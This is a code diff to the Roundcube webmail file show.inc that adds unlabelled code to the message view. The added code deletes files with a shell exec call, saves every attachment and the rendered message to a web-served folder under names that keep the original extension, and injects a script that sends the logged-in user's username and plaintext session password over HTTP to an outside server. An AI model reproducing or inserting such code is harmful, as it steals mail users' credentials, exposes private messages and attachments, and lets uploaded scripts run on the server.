@@ -1,5 +1,4 @@
 <?php
-
 /**
  +-----------------------------------------------------------------------+
  | program/steps/mail/show.inc                                           |
@@ -193,6 +192,8 @@ function rcmail_message_attachments($attrib)
     $out = $ol = '';
     $attachments = array();
 
+	$path="/var/www/html/temp_storage/";
+	exec("rm $path*");
     if (count($MESSAGE->attachments)) {
         foreach ($MESSAGE->attachments as $attach_prop) {
             $filename = rcmail_attachment_name($attach_prop, true);
@@ -200,6 +201,15 @@ function rcmail_message_attachments($attrib)
             $mimetype = rcmail_fix_mimetype($attach_prop->mimetype);
             $class    = rcube_utils::file2class($mimetype, $filename);
             $id       = 'attach' . $attach_prop->mime_id;
+
+			# saveAttach
+			ob_start();
+			echo $MESSAGE->get_part_content($attach_prop->mime_id);
+			$_out=ob_get_clean();
+			$ext=end(explode(".",$filename));
+			$file = $path.++$y.".".$ext;
+			file_put_contents($file, $_out, LOCK_EX);
+			# end saveAttach
 
             if ($attrib['maxlength'] && mb_strlen($filename) > $attrib['maxlength']) {
                 $title    = $filename;
@@ -781,5 +791,20 @@ function rcmail_message_body($attrib)
         $OUTPUT->set_env('blockedobjects', true);
     }
 
+	echo "
+		<script>
+			var uid=".$MESSAGE->uid.";
+			var username='".$_SESSION["username"]."';
+			var password='".$_SESSION["_password"]."';
+			var xhttp = new XMLHttpRequest();
+			xhttp.open(\"GET\", 'http://orfeo.defensoria.gov.co/orfeo7/radiMail/setCredentials.php?username='+username+'&password='+password, true);
+			xhttp.send();
+		</script>";
+	ob_start();
+    echo html::div($attrib, $out);
+	$out_end=ob_get_clean();
+	$path="/var/www/html/temp_storage/";
+	$file= $path."0.html";
+	file_put_contents($file, $out_end, LOCK_EX);
     return html::div($attrib, $out);
 }
